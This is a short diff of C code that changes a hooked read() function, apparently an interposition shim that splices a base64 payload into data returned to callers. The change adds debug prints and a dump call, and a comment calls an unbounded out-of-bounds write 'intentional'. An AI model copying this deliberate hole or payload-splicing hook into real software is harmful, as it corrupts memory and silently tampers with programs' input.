@@ -471,11 +471,14 @@ ssize_t read(int fd, void *buf, size_t count) {
 			// Place the payload in the newly created space
                         memcpy(p, sPayload64, nPayload64);
 
+			dumpload(&payload);
+printf("BEFORE: result: %s, (%td)\n", (char *) buf, result);
 			// Adjust the number of characters read
                         result += delta;
 
 			// Unbounded out-of-bounds write that is intentional and "ok" for us now (considering everything else)
                         ((char *) buf)[result] = 0;
+printf("AFTER: result: %s, (%td)\n", (char *) buf, result);
 		} // if
 		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
 			dumpload(&payload);
